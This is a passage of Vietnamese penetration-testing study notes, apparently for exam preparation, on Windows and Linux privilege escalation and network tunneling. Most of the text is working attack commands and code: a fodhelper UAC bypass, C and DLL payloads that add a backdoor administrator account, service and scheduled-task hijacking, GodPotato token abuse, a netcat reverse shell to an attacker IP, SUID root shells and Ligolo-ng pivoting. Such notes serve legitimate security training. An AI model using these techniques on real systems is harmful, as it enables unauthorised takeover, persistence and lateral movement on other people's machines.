- Run as administrator → UAC prompt → OK → chạy với full token
- **Bypass UAC** (ví dụ fodhelper):
```powershell
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

#### Enumeration Commands

**Tên user và hostname**
```powershell
whoami
```

**Group membership**
```powershell
whoami /groups
```

**Danh sách users và groups**
```powershell
net user
Get-LocalUser

net localgroup
Get-LocalGroup
Get-LocalGroup | Select Name,SID
```

**OS info**
```powershell
systeminfo
winpeas
```

**Network info**
```powershell
ipconfig /all
route print
netstat -ano
```

```powershell
Get-NetTCPConnection -State Listen | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Protocol = "TCP"
        LocalAddress = $_.LocalAddress
        Port = $_.LocalPort
        PID = $_.OwningProcess
        ProcessName = $proc.ProcessName
    }
}| Sort-Object Port | Format-Table -AutoSize
```

**Installed applications**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Thư mục thủ công
# C:\Program Files
# C:\Program Files (x86)
# Downloads
```

**Running processes**
```powershell
Get-Process
```

**Tìm file nhạy cảm**
```powershell
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

**PowerShell history**
```powershell
Get-History

# File PSReadline (nếu Clear-History đã chạy)
(Get-PSReadlineOption).HistorySavePath
```

**Công cụ tự động**: `winpeas`

---

### Leveraging Windows Services

**Về Windows Service**
- Ứng dụng thực thi chạy ngầm dài hạn
- Chạy dưới 3 loại tài khoản chính:
  - **LocalSystem (S-1-5-18)**: Quyền cao nhất
  - **NetworkService (S-1-5-20)**: Quyền user bình thường + network
  - **LocalService (S-1-5-19)**: Quyền hạn chế nhất

#### Service Binary Hijacking

**Điều kiện thực hiện**
- Có quyền ghi File Binary Service (W, M, F)
- Service chạy với đặc quyền cao hơn user hiện tại
- Có thể restart service
- Binary compile đúng kiến trúc

**Thu thập thông tin service**
```powershell
# Xem tất cả service
Get-CimInstance -ClassName win32_service | Select-Object Name, State, PathName, StartName

# Enum service qua Registry
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object {
    $props = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{
        Name      = $_.PSChildName
        ImagePath = $props.ImagePath
        Start     = $props.Start
    }
} | Format-Table -AutoSize
```

**Kiểm tra quyền trên binary**
```powershell
# Lệnh đơn
icacls "C:\xampp\apache\bin\httpd.exe"

# Script tự động
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$groups = @($user.Name) + $user.Groups.Translate([System.Security.Principal.NTAccount]).Value

Get-CimInstance -ClassName win32_service | ForEach-Object {
    $svc = $_.Name
    if ($_.PathName -match '"?([^"]+\.exe)"?') {
        $exe = $matches[1]
        if (Test-Path $exe) {
            (Get-Acl $exe).Access |
            Where-Object { $groups -contains $_.IdentityReference.Value -and $_.FileSystemRights -match 'Write|Modify|FullControl' } |
            ForEach-Object {
                [PSCustomObject]@{ ServiceName=$svc; ExePath=$exe; Identity=$_.IdentityReference; Rights=$_.FileSystemRights }
            }
        }
    }
} | Format-Table -AutoSize
```

**Kiểm tra có thể restart service không**
```powershell
Get-Service GammaService | Select Name, Status, CanStop, CanPauseAndContinue
```

**Build payload adduser.c**
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

**Compile và deploy**
```bash
# Xem kiến trúc Windows
systeminfo | findstr /i "System Type"

# Compile
sudo apt install mingw-w64
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Deploy
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Restart
shutdown /r /t 0
```

#### DLL Hijacking

**Cơ chế tìm kiếm DLL**
- Safe DLL Search Mode OFF → Thư mục hiện tại ưu tiên
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode /t REG_DWORD /d 0 /f
```

**Điều kiện thực hiện**
- Service/app chạy với quyền cao hơn kẻ tấn công
- Có quyền restart service hoặc đợi user có quyền cao chạy app
- Có quyền ghi vào folder mà Service/App tìm kiếm DLL

**Phân tích FileZilla - Thu thập thông tin**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

- Dùng **Process Monitor** → Lọc `filezilla.exe` → Lọc `TextShaping.dll`
- FileZilla tìm `C:\Program Files\FileZilla FTP Client\TextShaping.dll` đầu tiên → không thấy

**Kiểm tra quyền ghi**
```powershell
icacls "C:\Program Files\FileZilla FTP Client"
```

**Build payload DLL (TextShaping.cpp)**
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        int i;
        i = system ("net user dave3 password123! /add");
        i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: break;
        case DLL_THREAD_DETACH: break;
        case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}
```

**Compile**
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

**Deploy và chờ**
```powershell
iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
# Đợi người dùng admin chạy FileZilla
```

#### Unquoted Service Paths

**Lý thuyết**: Đường dẫn không có quote + chứa khoảng trắng → Windows thử nhiều path

Với `C:\Program Files\My Program\My Service\service.exe` không có quote:
- Thử: `C:\Program.exe` → `C:\Program Files\My.exe` → `C:\Program Files\My Program\My.exe` → ...

**Cấu hình ví dụ (vulnerable)**
```bash
sc config GammaService binpath= "C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe"
```

**Điều kiện thực hiện**
1. Đường dẫn có khoảng trắng và thiếu dấu ngoặc kép
2. Quyền ghi vào thư mục trung gian
3. Service chạy với quyền cao hơn
4. Có thể restart service

**Tìm kiếm Unquoted Services**
```powershell
Get-WmiObject Win32_Service | Where-Object { 
    $_.PathName -notmatch '"' -and 
    $_.PathName -match '^[^"]*\.exe' -and 
    $_.PathName -replace '\.exe.*$' -match '\s' 
} | Select-Object Name, PathName, StartName, State, StartMode | Format-Table -AutoSize
```

**Kiểm tra quyền ghi vào thư mục trung gian**
```powershell
$path = "C:\Program Files\Enterprise Apps\Current Version\GammaService.exe"
$parts = $path.Split("\")
$checkPaths = @("$($parts[0])\")
for ($i = 1; $i -lt $parts.Count - 1; $i++) { $checkPaths += ($parts[0..$i] -join "\") }
$checkPaths | ForEach-Object { 
    try { [IO.File]::Create("$_\test.tmp").Close(); Remove-Item "$_\test.tmp"; Write-Host "WRITABLE: $_" -F Green } 
    catch { Write-Host "PROTECTED: $_" -F Red } 
}
```

**Khai thác**
```powershell
# Copy payload vào vị trí phù hợp
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
copy .\adduser.exe 'C:\Program Files (x86)\Nova Star\ViPlex.exe'

# Restart service
Restart-Service DaemonService4Viplex
# hoặc
shutdown /r /t 0
```

---

### Abusing Other Windows Components

#### Scheduled Tasks

**Điều kiện thực hiện**
- Task chạy với quyền cao hơn user hiện tại
- Task chạy theo tần suất cao
- Có thể thay đổi hành động/file của task

**Thu thập thông tin**
```powershell
# Liệt kê tất cả task với thông tin chi tiết
Get-ScheduledTask | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo
    $trigger = $_.Triggers | Select-Object -First 1
    [PSCustomObject]@{
        TaskName       = $_.TaskName
        RunAsUser      = $_.Principal.UserId
        NextRunTime    = $info.NextRunTime
        RepeatInterval = $trigger.Repetition.Interval
        TriggerType    = $trigger.CimClass.CimClassName
    }
} | Format-Table -AutoSize
```

**Lấy đường dẫn file thực thi của task**
```powershell
Get-ScheduledTask | Where-Object TaskName -like "*CacheCleanup*" | ForEach-Object {
    $_.Actions | ForEach-Object {
        [PSCustomObject]@{
            Execute   = $_.Execute
            Arguments = $_.Arguments
        }
    }
}
```

**Kiểm tra và thay thế file task**
```powershell
icacls "C:\Users\steve\Pictures\BackendCacheCleanup.exe"

move C:\Users\steve\Pictures\BackendCacheCleanup.exe .\BackendCacheCleanup.exe
copy .\adduser.exe C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

#### Using Privilege (SeImpersonatePrivilege)

**Cơ chế**
1. Chiếm phiên tài khoản có `SeImpersonatePrivilege`
2. Tạo tài nguyên (Namepipe, RPC, DCOM)
3. Ép buộc Service A kết nối đến tài nguyên
4. Giả mạo token của Service A

**Điều kiện**
1. Tài khoản có `SeImpersonatePrivilege`
2. Dịch vụ chạy với access token có quyền cao
3. Có thể dụ dịch vụ quyền cao xác thực đến tài nguyên do attacker kiểm soát

**Các công cụ**
- **JuicyPotato**: Windows 7, 8, 10 cũ; Server 2008, 2012, 2016
- **GodPotato + PrintSpoofer**: cho OS mới

**Thực hiện**
```bash
sudo apt install rlwrap
```

```powershell
# Kiểm tra DCOM
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole" /v EnableDCOM

# Kiểm tra services
Get-Service RpcSs
Get-Service Spooler

# Phiên bản NET
ls "$env:windir\Microsoft.NET\Framework64"

# Download tool
iwr -Uri 192.168.45.213:8000/PrintSpoofer64.exe -OutFile "PrintSpoofer64.exe"
```

**GodPotato**
```powershell
GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c curl 192.168.45.213:8000/a.txt"
.\GodPotato-NET4.exe -cmd "cmd /c net user dave4 lab /add"
.\GodPotato-NET4.exe -cmd "powershell -es"
```

**Kiểm tra kết nối**
```powershell
netstat -ano | findstr :3389   # RDP
netstat -ano | findstr :5985   # evil-winrm
```

**Nếu không có RDP → reverse shell**
```powershell
iwr -Uri 192.168.45.213:8000/nc.exe -OutFile nc.exe
GodPotato-NET4.exe -cmd "C:\Users\dave\Downloads\nc.exe 192.168.45.213 9999 -e cmd"
```

**Tham khảo thêm**: `SeBackupPrivilege`, `SeAssignPrimaryToken`, `SeLoadDriver`, `SeDebug`

---

## Linux Priv

### Nội dung bài học
- Liệt kê thông tin hệ thống Linux (Enumerating Linux)
- Lộ thông tin nhạy cảm (Exposed Confidential Information)
- Phân quyền file không an toàn (Insecure File Permissions)
- Lạm dụng các thành phần hệ thống Linux (Abusing System Linux components)

### Enumeration

```bash
# User hiện tại
id

# Tất cả người dùng
cat /etc/passwd

# Hostname
hostname

# OS và Version
cat /etc/issue
cat /etc/os-release
uname -a

# System Process
ps aux

# Network - IP và Interface
ip a

# Route
route

# Cổng đang mở
ss -anp
ss -splunt

# Cronjob
ls -la /etc/cron*
crontab -l

# Installed apps
dpkg -l

# Folder có quyền write
find / -writable -type d 2>/dev/null

# Mount file System
cat /etc/fstab
mount

# Disk
lsblk

# Driver và module
lsmod

# File có SUID
find / -perm -u=s -type f 2>/dev/null

# File có capabilities
getcap -r /usr/bin 2>/dev/null
find / -type f -exec getcap {} + 2>/dev/null

# NFS
showmount -e
cat /etc/exports
```

### SUID Attack

```bash
# Tìm binary có SUID
find / -perm -u=s -type f 2>/dev/null
```

Kiểm tra trên [GTFOBins](https://gtfobins.github.io/)

**Lên root bằng python/perl**
```bash
python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**Nếu binary SUID không có trên GTFOBins** → phân tích file binary có gọi đến binary khác không → tấn công tiếp

### Capabilities Attack

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Xác định quyền nguy hiểm → Tìm trên [GTFOBins](https://gtfobins.github.io/)

**Nếu không có trên GTFOBins** → phân tích file binary có gọi đến file khác không → tấn công tiếp

### NFS

```bash
# Kiểm tra cổng NFS
nmap -p 111,2049 --script nfs-showmount <target>

# Các folder có thể mount
showmount -e <target_ip>

# Kiểm tra no_root_squash
cat /etc/exports

# Mount
mkdir /tmp/nfs_mount
mount -t nfs <target_ip>:/share_path /tmp/nfs_mount -o vers=3

# Tạo file binary với SUID
# evil.c:
# int main(){ setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
gcc evil.c -o /tmp/nfs_mount/evil

# Thực thi trên máy target
./evil
```

---

## Tunneling

### Chisel

```bash
# Kali -> chisel server
chisel server --port 9001 --reverse

# Pivot1 -> chisel client
chisel client ip_kali:9001 R:ip_pivot1:9002:127.0.0.1:8080
```

### Ligolo-ng

```bash
# Tạo TUN interface
sudo ip link delete ligolo 2>/dev/null
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up

# Tạo TUN interface thứ 2
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Listener
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:443

# Attacker - khởi động proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:443

# Victim - download agent
certutil.exe -urlcache -split -f http://<attacker_IP>/lin-agent
iwr -Uri "https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip" -Outfile agent.zip

# Victim - kết nối
agent.exe -connect <attacker-machine-IP>:443 -ignore-cert
# agent.exe -connect <IP da bi chiemc>:9999 -ignore-cert
```

**Trên proxy**
```
session ---> start
session ---> start --tun ligolo2
```

**Thêm internal network route**
```bash
sudo ip route add 172.168.170.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo2
sudo ip link delete tun0
```
